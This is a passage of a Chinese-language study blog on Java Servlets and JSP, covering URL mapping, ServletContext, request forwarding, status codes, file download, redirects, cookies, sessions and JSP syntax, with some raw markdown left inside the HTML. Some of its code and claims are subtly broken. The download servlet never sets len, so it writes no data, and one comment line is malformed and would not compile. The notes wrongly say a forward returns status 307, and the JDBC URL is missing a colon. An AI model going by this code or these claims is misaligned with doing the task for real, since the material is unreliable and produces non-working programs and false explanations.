class=\"line\"></span><br><span class=\"line\">  - ```xml</span><br><span class=\"line\">    &lt;servlet-mapping&gt;</span><br><span class=\"line\">    \t&lt;servlet-name&gt;hello&lt;/servlet-name&gt;</span><br><span class=\"line\">        &lt;url-pattern&gt;/*&lt;/url-pattern&gt;  &lt;!--默认请求到hello--&gt;</span><br><span class=\"line\">    &lt;/servlet-mapping&gt;</span><br></pre></td></tr></table></figure></li>\n</ul>\n</li>\n<li><p>可以自定义后缀实现请求映射(类似于正则)</p>\n<ul>\n<li>```xml<servlet-mapping>\n    <servlet-name>hello</servlet-name>\n    <url-pattern>*.abcd</url-pattern>  <!--只要请求后缀有abcd都会映射到hello-->\n</servlet-mapping>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\">#### ServletContext</span><br><span class=\"line\"></span><br><span class=\"line\">web容器在启动的时候,它会为每个web程序都创建一个对应的ServletContext对象,它代表了当前的web应用</span><br><span class=\"line\"></span><br><span class=\"line\">##### 共享数据</span><br><span class=\"line\"></span><br><span class=\"line\">很像android中页面传参的intent.putExtra和intent.getExtra</span><br><span class=\"line\"></span><br><span class=\"line\">- 在一个servlet中保存的数据,可以在另外一个servlet中拿到</span><br><span class=\"line\"></span><br><span class=\"line\">有一说一,java万物皆对象的思想确实牛逼,继承了直接就可以用父类方法,不同子类还能互动</span><br><span class=\"line\"></span><br><span class=\"line\">![image-20220113173732922](https://gitee.com/blue_satchel/images/raw/master/image-20220113173732922.png)</span><br><span class=\"line\"></span><br><span class=\"line\">![image-20220113173739121](https://gitee.com/blue_satchel/images/raw/master/image-20220113173739121.png)</span><br><span class=\"line\"></span><br><span class=\"line\">![image-20220113173749274](https://gitee.com/blue_satchel/images/raw/master/image-20220113173749274.png)</span><br><span class=\"line\"></span><br><span class=\"line\">![image-20220113173756430](https://gitee.com/blue_satchel/images/raw/master/image-20220113173756430.png)</span><br><span class=\"line\"></span><br><span class=\"line\">注意点:因为setAttribute写在了helloServlet中的doGet里面,所以要先请求一下/hello,再去请求/getname</span><br><span class=\"line\"></span><br><span class=\"line\">记得类型转换为String</span><br><span class=\"line\"></span><br><span class=\"line\">##### 获取初始化参数</span><br><span class=\"line\"></span><br><span class=\"line\">web.xml中</span><br><span class=\"line\"></span><br><span class=\"line\">```xml</span><br><span class=\"line\">&lt;context-param&gt;</span><br><span class=\"line\">    &lt;param-name&gt;url&lt;/param-name&gt;</span><br><span class=\"line\">    &lt;param-value&gt;jdbc:mysql//localhost:3306/mybatis&lt;/param-value&gt;</span><br><span class=\"line\">&lt;/context-param&gt;</span><br></pre></td></tr></table></figure></li>\n</ul>\n</li>\n</ul>\n<p>java类里面</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title\">doGet</span><span class=\"params\">(HttpServletRequest req, HttpServletResponse resp)</span> <span class=\"keyword\">throws</span> ServletException, IOException </span>&#123;</span><br><span class=\"line\">    resp.setContentType(<span class=\"string\">&quot;text/html&quot;</span>);</span><br><span class=\"line\">    resp.setCharacterEncoding(<span class=\"string\">&quot;utf-8&quot;</span>);</span><br><span class=\"line\">    ServletContext context=<span class=\"keyword\">this</span>.getServletContext();</span><br><span class=\"line\">    String url = context.getInitParameter(<span class=\"string\">&quot;url&quot;</span>);</span><br><span class=\"line\">    resp.getWriter().print(url)        </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>请求对应页面会打印出jdbc:mysql//localhost:3306/mybatis</p>\n<h5 id=\"请求转发\"><a href=\"#请求转发\" class=\"headerlink\" title=\"请求转发\"></a>请求转发</h5><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">dispatcher</span> <span class=\"keyword\">extends</span> <span class=\"title\">HttpServlet</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title\">doGet</span><span class=\"params\">(HttpServletRequest req, HttpServletResponse resp)</span> <span class=\"keyword\">throws</span> ServletException, IOException </span>&#123;</span><br><span class=\"line\">        ServletContext context= <span class=\"keyword\">this</span>.getServletContext();</span><br><span class=\"line\">        context.getRequestDispatcher(<span class=\"string\">&quot;/hello&quot;</span>).forward(req,resp);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>请求sd就等于请求了/hello,并且浏览器状态码为200,不是3**的重定向</p>\n<p>我觉得对于安全性来说很好,A请求B,B可以去请求C的内容,虽然A得到了C的内容,但是A永远只和B交流</p>\n<p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220113222128264.png\" alt=\"image-20220113222128264\"></p>\n<h5 id=\"读取资源-配置-文件\"><a href=\"#读取资源-配置-文件\" class=\"headerlink\" title=\"读取资源(配置)文件\"></a>读取资源(配置)文件</h5><p>Properties</p>\n<ul>\n<li>在java目录下新建properties</li>\n<li>在resources目录下新建properties</li>\n</ul>\n<p>发现:都被打包到了同一个路径下:classes,俗称这个路径为classpath</p>\n<p>需要一个文件流</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><h3 id=\"HttpServletResponse\"><a href=\"#HttpServletResponse\" class=\"headerlink\" title=\"HttpServletResponse\"></a>HttpServletResponse</h3><p>web服务器接收到客户端的http请求,针对这个请求,分别创建一个代表请求的HttpServletRequest对象,代表响应的一个HttpServletResponse对象</p>\n<p>获取客户端请求过来的参数,找HttpServletRequest</p>\n<p>如果要给客户端响应信息,找HttpServletResponse</p>\n<h4 id=\"响应状态码\"><a href=\"#响应状态码\" class=\"headerlink\" title=\"响应状态码\"></a>响应状态码</h4><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> SC_CONTINUE = <span class=\"number\">100</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_SWITCHING_PROTOCOLS = <span class=\"number\">101</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_OK = <span class=\"number\">200</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_CREATED = <span class=\"number\">201</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_ACCEPTED = <span class=\"number\">202</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_NON_AUTHORITATIVE_INFORMATION = <span class=\"number\">203</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_NO_CONTENT = <span class=\"number\">204</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_RESET_CONTENT = <span class=\"number\">205</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_PARTIAL_CONTENT = <span class=\"number\">206</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_MULTIPLE_CHOICES = <span class=\"number\">300</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_MOVED_PERMANENTLY = <span class=\"number\">301</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_MOVED_TEMPORARILY = <span class=\"number\">302</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_FOUND = <span class=\"number\">302</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_SEE_OTHER = <span class=\"number\">303</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_NOT_MODIFIED = <span class=\"number\">304</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_USE_PROXY = <span class=\"number\">305</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_TEMPORARY_REDIRECT = <span class=\"number\">307</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_BAD_REQUEST = <span class=\"number\">400</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_UNAUTHORIZED = <span class=\"number\">401</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_PAYMENT_REQUIRED = <span class=\"number\">402</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_FORBIDDEN = <span class=\"number\">403</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_NOT_FOUND = <span class=\"number\">404</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_METHOD_NOT_ALLOWED = <span class=\"number\">405</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_NOT_ACCEPTABLE = <span class=\"number\">406</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_PROXY_AUTHENTICATION_REQUIRED = <span class=\"number\">407</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_REQUEST_TIMEOUT = <span class=\"number\">408</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_CONFLICT = <span class=\"number\">409</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_GONE = <span class=\"number\">410</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_LENGTH_REQUIRED = <span class=\"number\">411</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_PRECONDITION_FAILED = <span class=\"number\">412</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_REQUEST_ENTITY_TOO_LARGE = <span class=\"number\">413</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_REQUEST_URI_TOO_LONG = <span class=\"number\">414</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_UNSUPPORTED_MEDIA_TYPE = <span class=\"number\">415</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_REQUESTED_RANGE_NOT_SATISFIABLE = <span class=\"number\">416</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_EXPECTATION_FAILED = <span class=\"number\">417</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_INTERNAL_SERVER_ERROR = <span class=\"number\">500</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_NOT_IMPLEMENTED = <span class=\"number\">501</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_BAD_GATEWAY = <span class=\"number\">502</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_SERVICE_UNAVAILABLE = <span class=\"number\">503</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_GATEWAY_TIMEOUT = <span class=\"number\">504</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> SC_HTTP_VERSION_NOT_SUPPORTED = <span class=\"number\">505</span>;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"常见应用\"><a href=\"#常见应用\" class=\"headerlink\" title=\"常见应用\"></a>常见应用</h4><h5 id=\"1-向浏览器输出消息\"><a href=\"#1-向浏览器输出消息\" class=\"headerlink\" title=\"1.向浏览器输出消息\"></a>1.向浏览器输出消息</h5><p>getWriter(),getOutputStream()</p>\n<p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220113224928187.png\" alt=\"image-20220113224928187\"></p>\n<h5 id=\"2-下载文件\"><a href=\"#2-下载文件\" class=\"headerlink\" title=\"2.下载文件\"></a>2.下载文件</h5><ol>\n<li>要获取下载文件路径</li>\n<li>下载文件名是啥</li>\n<li>设置想办法让浏览器能够支持下载我们需要的东西</li>\n<li>获取下载文件的输入流</li>\n<li>创建缓冲区</li>\n<li>获取OutputStream对象</li>\n<li>将FileOutputStream流写入到buffer缓冲区</li>\n<li>使用OutputStream将缓冲区中的数据输出到客户端</li>\n</ol>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.blue.servlet;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.ServletException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.ServletOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.http.HttpServlet;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.FileInputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">down</span> <span class=\"keyword\">extends</span> <span class=\"title\">HttpServlet</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title\">doGet</span><span class=\"params\">(HttpServletRequest req, HttpServletResponse resp)</span> <span class=\"keyword\">throws</span> ServletException, IOException </span>&#123;</span><br><span class=\"line\">        String realPath=<span class=\"string\">&quot;F:\\\\Project\\\\maven\\\\maven_web_1\\\\src\\\\main\\\\resources\\\\img.png&quot;</span>;</span><br><span class=\"line\">        <span class=\"comment\">//2.获取下载文件名</span></span><br><span class=\"line\">        String filename=realPath.substring(realPath.lastIndexOf(<span class=\"string\">&quot;\\\\&quot;</span>)+<span class=\"number\">1</span>);</span><br><span class=\"line\">        <span class=\"comment\">//3.设置头</span></span><br><span class=\"line\">        /中文文件名的话还要设置编码</span><br><span class=\"line\">        resp.setHeader(<span class=\"string\">&quot;Content-Disposition&quot;</span>,<span class=\"string\">&quot;attachment;filename=&quot;</span>+filename);</span><br><span class=\"line\">        <span class=\"comment\">//4.获取下载文件的输入流</span></span><br><span class=\"line\">        FileInputStream in=<span class=\"keyword\">new</span> FileInputStream(realPath);</span><br><span class=\"line\">        <span class=\"comment\">//5.创建缓冲区</span></span><br><span class=\"line\">        <span class=\"keyword\">int</span> len=<span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">byte</span>[] buffer=<span class=\"keyword\">new</span> <span class=\"keyword\">byte</span>[<span class=\"number\">1024</span>];</span><br><span class=\"line\">        <span class=\"comment\">//6.获取OutputStream对象</span></span><br><span class=\"line\">        ServletOutputStream out=resp.getOutputStream();</span><br><span class=\"line\">        <span class=\"comment\">//7.将fileOutputStream流写入到buffer缓冲区,使用OutputStream将缓冲区中的数据输出到客户端</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> (in.read(buffer)&gt;<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">            out.write(buffer,<span class=\"number\">0</span>,len);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        in.close();</span><br><span class=\"line\">        out.close();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"实现网页重定向\"><a href=\"#实现网页重定向\" class=\"headerlink\" title=\"实现网页重定向\"></a>实现网页重定向</h4><p>不同于servlet的资源请求重定向,response是通过浏览器实现的重定向</p>\n<p><code>resp.sendRedirect(&quot;路径&quot;);</code></p>\n<p><code>&amp;&#123;pageContext.request.contextPath&#125;</code>代表当前项目路径</p>\n<p>重定向和转发的区别:</p>\n<p>编码:转发307,重定向302</p>\n<p>相同点:页面都会跳转</p>\n<p>不同点:url变与不变</p>\n<h3 id=\"HttpServletRequest\"><a href=\"#HttpServletRequest\" class=\"headerlink\" title=\"HttpServletRequest\"></a>HttpServletRequest</h3><p>通过HttpServletRequest获取客户端的信息</p>\n<p>获取前端提交的参数</p>\n<p><code>req.getParameter(&quot;username&quot;);</code></p>\n<p><code>getParamaterValues();</code>返回一个字符数组</p>\n<h4 id=\"Cookie\"><a href=\"#Cookie\" class=\"headerlink\" title=\"Cookie\"></a>Cookie</h4><ul>\n<li>一个Cookie只能保存一个信息</li>\n<li>一个web站点可以给浏览器发送多个cookie,最多存放20个cookie</li>\n<li>cookie大小有限制4kb</li>\n<li>300个cookie浏览器上限</li>\n</ul>\n<p>删除Cookie</p>\n<ul>\n<li>不设置有效期,关闭浏览器,自动失效</li>\n<li>设置有效期为0</li>\n</ul>\n<p>传递中文记得使用URLEncoder.encode(“中文”,”utf-8”);</p>\n<h4 id=\"Session\"><a href=\"#Session\" class=\"headerlink\" title=\"Session\"></a>Session</h4><ul>\n<li>服务器会给每一个用户(浏览器)创建一个Session对象</li>\n<li>一个Session独占一个浏览器,只要浏览器没有关闭,这个Session就存在</li>\n<li>用户登录之后,整个网站它都可以访问</li>\n</ul>\n<h3 id=\"JSP\"><a href=\"#JSP\" class=\"headerlink\" title=\"JSP\"></a>JSP</h3><p>JAVA Server Pages</p>\n<p>最大特点:</p>\n<ul>\n<li>写JSP就像在写HTML</li>\n<li>区别:<ul>\n<li>HTML静态数据</li>\n<li>JSP页面可以嵌入JAVA代码,为用户提供动态数据</li>\n</ul>\n</li>\n</ul>\n<p>JSP本质上就是Servlet</p>\n<img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220114211237653.png\" alt=\"image-20220114211237653\"  />\n\n<h5 id=\"jsp与对应jsp-java转换关系\"><a href=\"#jsp与对应jsp-java转换关系\" class=\"headerlink\" title=\"jsp与对应jsp.java转换关系\"></a>jsp与对应jsp.java转换关系</h5><p>只要是java代码就原封不动的输出</p>\n<p>如果是HTML代码,就会被转换为:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">out.write(&quot;&lt;xxxxxxx&gt;&quot;)</span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"JSP基础语法\"><a href=\"#JSP基础语法\" class=\"headerlink\" title=\"JSP基础语法\"></a>JSP基础语法</h4><p>开始前要先导入依赖,<a href=\"https://mvnrepository.com/\">maven依赖在线查询</a></p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!--Servlet依赖--&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>javax.servlet<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>javax.servlet-api<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>3.1.0<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!-- https://mvnrepository.com/artifact/javax.servlet.jsp/javax.servlet.jsp-api --&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!--JSP依赖--&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>javax.servlet.jsp<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>javax.servlet.jsp-api<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>2.3.3<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">scope</span>&gt;</span>provided<span class=\"tag\">&lt;/<span class=\"name\">scope</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!--JSTL表达式的依赖--&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.glassfish.web<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>jakarta.servlet.jsp.jstl<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>2.0.0<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!--standard标签库--&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!-- https://mvnrepository.com/artifact/taglibs/standard --&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>taglibs<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>standard<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>1.1.2<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"语法\"><a href=\"#语法\" class=\"headerlink\" title=\"语法\"></a>语法</h4><h5 id=\"表达式\"><a href=\"#表达式\" class=\"headerlink\" title=\"表达式\"></a>表达式</h5><figure class=\"highlight jsp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%=变量或者表达式%&gt;</span><br><span class=\"line\">&lt;%=<span class=\"keyword\">new</span> java.util.Date()%&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>可以用${变量名}(EL表达式)代替,更高级,并且会将一些错误默认不显示,比如不存在的变量</p>\n<h5 id=\"脚本片段\"><a href=\"#脚本片段\" class=\"headerlink\" title=\"脚本片段\"></a>脚本片段</h5><figure class=\"highlight jsp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%</span><br><span class=\"line\">\tjava脚本片段</span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"JSP声明\"><a href=\"#JSP声明\" class=\"headerlink\" title=\"JSP声明\"></a>JSP声明</h5><figure class=\"highlight jsp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%!</span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">int</span> globalVar = <span class=\"number\">0</span>;    </span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n\n<p>会被编译到jsp生成的java类中,其他的会被生成到对应的java文件中的jspService方法中</p>\n<h5 id=\"在代码中嵌入HTML元素\"><a href=\"#在代码中嵌入HTML元素\" class=\"headerlink\" title=\"在代码中嵌入HTML元素\"></a>在代码中嵌入HTML元素</h5><figure class=\"highlight jsp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;%<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">5</span>;i++)&#123;</span><br><span class=\"line\">    %&gt;</span><br><span class=\"line\">    &lt;h1&gt;hello,world &lt;%=i%&gt; &lt;/h1&gt;</span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">%&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n\n<img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220115211903441.png\" alt=\"image-20220115211903441\" style=\"zoom:80%;\" />\n\n<h3 id=\"JSP指令\"><a href=\"#JSP指令\" class=\"headerlink\" title=\"JSP指令\"></a>JSP指令</h3><h5 